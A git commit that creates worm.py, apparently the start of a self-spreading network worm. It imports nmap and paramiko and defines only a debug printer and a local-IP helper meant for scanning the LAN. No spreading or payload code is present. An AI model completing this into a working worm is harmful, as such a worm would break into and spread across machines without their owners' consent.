77e843f8601844655ee282f3b72d502eb1c4187c
Filip Komárek <pylyf.kom@gmail.com>
2018-07-06 22:01:00 +0200

    Create worm.py

---
+++ worm.py
@@ -0,0 +1,39 @@
+####################################
+# File name: worm.py               #
+# Author: Filip Komárek            #
+# Status: Development              #
+# Date created: 7/6/2018           #
+####################################
+import nmap
+import paramiko
+import os
+import logging
+
+logger = logging.getLogger(__name__)
+logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+                    level=logging.INFO)
+debug = True # Set this to True to see debug messages
+
+
+def debug_print(text):
+    """
+    Prints debug messages only when debug mode is activated.
+
+    Args:
+        text: string
+    """
+    if debug:
+        print("[?] " + text)
+
+
+def get_ip():
+    """
+    Gets private IP address of this machine.
+    This will be used for scanning other computers on LAN.
+
+    Returns:
+        private IP address
+    """
+    import socket
+    ip = socket.gethostbyname(socket.gethostname())
+    return ip
